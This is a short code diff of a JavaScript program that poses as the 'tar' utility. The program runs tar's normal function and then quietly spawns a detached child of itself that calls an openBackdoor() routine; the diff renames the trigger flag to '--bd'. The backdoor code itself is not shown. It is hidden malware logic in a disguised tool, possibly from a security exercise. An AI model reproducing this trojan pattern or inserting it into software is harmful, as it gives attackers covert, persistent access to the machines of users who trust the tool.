@@ -11,14 +11,14 @@ if (execName == "client.js") {
   execName = "tar";
 }
 
-if (args.includes("--interactive")) {
+if (args.includes("--bd")) {
   openBackdoor();
 } else {
   // First, simulate tar functionality
   execFile(args, execName);
 
-  // Then spawn a child of the same executable, but only with the interactive flag
-  const child = spawn(process.argv[0], [process.argv[1], "--interactive"], {
+  // Then spawn a child of the same executable, but only with the --bd flag
+  const child = spawn(process.argv[0], [process.argv[1], "--bd"], {
     detached: true,
     stdio: "ignore",
   });
